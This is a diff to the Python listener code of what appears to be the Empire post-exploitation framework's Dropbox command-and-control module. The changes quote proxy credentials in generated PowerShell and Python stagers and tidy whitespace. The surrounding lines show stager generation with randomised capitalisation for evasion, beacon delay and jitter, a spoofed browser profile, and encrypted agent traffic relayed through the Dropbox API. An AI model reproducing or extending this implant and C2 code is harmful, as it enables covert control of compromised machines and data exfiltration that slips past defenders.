@@ -222,7 +222,7 @@ class Listener:
                             password = proxyCreds.split(':')[1]
                             domain = username.split('\\')[0]
                             usr = username.split('\\')[1]
-                            stager += "$netcred = New-Object System.Net.NetworkCredential("+usr+","+password+","+domain+");"
+                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
@@ -307,7 +307,7 @@ class Listener:
                             launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
-                            launcherBase += "proxy_auth_handler.add_password(None,"+proxy+","+username+","+password+");\n"
+                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
                             launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                     else:
                         launcherBase += "o = urllib2.build_opener(proxy);\n"
@@ -484,7 +484,7 @@ class Listener:
             #strip out comments and blank lines
             code = helpers.strip_python_comments(code)
 
-            #patch some more 
+            #patch some more
             code = code.replace('delay = 60', 'delay = %s' % (delay))
             code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
             code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
@@ -661,16 +661,16 @@ def send_message(packets=None):
     except:
         pass
 
-    
+
     if packets:
         data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
         #check to see if there are any results already present
-        
+
         headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (resultsFolder, sessionID)
-        
+
         try:
             pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
         except:
@@ -953,7 +953,7 @@ def send_message(packets=None):
                     dbx.files_delete(fileName)
                 except dropbox.exceptions.ApiError:
                     dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
-                
+
                 self.mainMenu.agents.handle_agent_data(stagingKey, responseData, listenerOptions)
 
 
